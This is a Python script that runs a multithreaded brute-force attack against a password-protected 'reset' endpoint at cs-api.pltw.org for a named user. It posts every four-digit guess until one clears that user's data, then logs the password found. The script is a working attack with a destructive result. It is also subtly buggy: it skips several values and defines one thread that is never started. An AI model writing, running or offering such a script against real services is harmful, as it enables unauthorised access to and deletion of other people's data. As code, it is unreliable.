import requests
import threading

user = "LiamP"

url = f"https://cs-api.pltw.org/{user}"

resetPassword = "/reset?password="

END_FUNC = False

def th0_1():
    global END_FUNC
    for i in range(0,1000):
        if i < 10:
            guess = f"000{i}"
        elif i < 100:
            guess = f"00{i}"
        elif i < 1000:
            guess = f"0{i}"
        else:
            guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th1_2():
    global END_FUNC
    for i in range(1001,2000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th2_3():
    global END_FUNC
    for i in range(2001,3000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th3_4():
    global END_FUNC
    for i in range(3001,4000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th4_5():
    global END_FUNC
    for i in range(4001,5000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th5_6():
    global END_FUNC
    for i in range(5001,6000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th6_7():
    global END_FUNC
    for i in range(6001,7000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th7_8():
    global END_FUNC
    for i in range(7001,8000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th8_9():
    global END_FUNC
    for i in range(8001,9000):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

def th9_10():
    global END_FUNC
    for i in range(9001,9999):
        guess = str(i)
        response = requests.post(url+resetPassword+guess)
        print(guess)
        if response.text == f"Data for endpoint {user} has been cleared.":
            print(f"The password to clear data is {guess}")
            with open("PasswordList", "a") as file:
                file.write(f"\nThe password for {url}'s api is: {guess}")
            END_FUNC = True
        if END_FUNC == True:
            break

th1 = threading.Thread(target=th0_1)
th1.start()

th2 = threading.Thread(target=th1_2)
th2.start()

th3 = threading.Thread(target=th2_3)
th3.start()

th4 = threading.Thread(target=th3_4)
th4.start()

th5 = threading.Thread(target=th4_5)
th5.start()

th6 = threading.Thread(target=th5_6)
th6.start()

th7 = threading.Thread(target=th6_7)
th7.start()

th8 = threading.Thread(target=th7_8)
th8.start()

th9 = threading.Thread(target=th8_9)
th9.start()